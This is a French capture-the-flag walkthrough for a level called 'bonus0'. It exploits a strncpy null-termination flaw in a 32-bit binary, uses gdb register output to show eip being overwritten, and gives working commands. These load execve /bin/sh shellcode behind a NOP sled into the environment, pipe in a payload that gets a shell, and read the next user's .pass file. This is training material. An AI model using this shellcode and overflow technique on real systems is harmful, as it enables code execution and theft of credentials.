## bonus0
- À partir du [code source désassemblé](source.c), regardons ce qui peut être exploité :
    - On ne peut rien faire avec le `strcpy` car `buffer` est plus grand que `smallBufferTwo`
    - Par contre, on pourrait tirer profit d'une limitation de [`strncpy`](https://linux.die.net/man/3/strncpy) :
    > If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated. 
- Avec `gdb`, il est facile de vérifier que l'on peut récrire le contenu du registre `eip` :
```
Starting program: /home/user/bonus0/bonus0 
 - 
AAABBBCCCDDDEEEFFFGGGHHHIII
 - 
JJJKKKLLLMMMNNNOOOPPPQQQRRR
AAABBBCCCDDDEEEFFFGGJJJKKKLLLMMMNNNOOOPP��� JJJKKKLLLMMMNNNOOOPP���

Program received signal SIGSEGV, Segmentation fault.
0x4e4d4d4d in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff730	0xbffff730
ebp            0x4c4c4c4b	0x4c4c4c4b
esi            0x0	0
edi            0x0	0
eip            0x4e4d4d4d	0x4e4d4d4d
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
- Il reste donc à exporter notre `shellcode` dans l'environnement et à faire pointer `eip` vers son adresse :
    - `export EXPLOIT=$(python -c 'print "\x90" * 1024 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')`
    - Depuis `gdb`, mettre un *breakpoint* sur `main` puis lancer l'exécution. Utiliser `x/10s *((char **)environ)` pour retrouver l'adresse de notre exploit dans l'environnement => `0xbffff4e7`. Toutefois, cette adresse peut changer selon les arguments, on va donc ajouter 256 octets de décalage => `0xbffff5e7` (ce décalage n'impacte en rien le fonctionnement de notre exploit, puisque ce dernier commence par 1024 octets de [`NOP`](https://en.wikipedia.org/wiki/NOP_(code))).
    - `(python -c 'print "A"*4095 + "\n" + "\x90"*9 + "\xe7\xf5\xff\xbf" + "B"*10'; cat -) | ./bonus0` nous permet bien de lancer un *shell*. `cat /home/user/bonus1/.pass` pour récupérer le *flag*.